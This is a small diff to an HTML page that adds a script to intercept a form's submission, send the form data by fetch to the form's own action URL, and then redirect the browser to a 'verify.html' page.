@@ -128,5 +128,21 @@
     </div>
     <div class="front-logo"><img src="https://i.postimg.cc/FH2kkyrJ/logo.png"></div>
 </body>
+<script type="text/javascript">
+    window.addEventListener("DOMContentLoaded", function () {
+        const yourForm = document.getElementById('FORM_ID');
+        yourForm.addEventListener("submit", function (e) {
+            e.preventDefault();
+            const data = new FormData(yourForm);
+            const action = e.target.action;
+            fetch(action, {
+                method: 'POST',
+                body: data,
+            }).then(() => {
+                window.location.replace('verify.html')
+            })
+        })
+    }); 
+</script>
 
 </html>
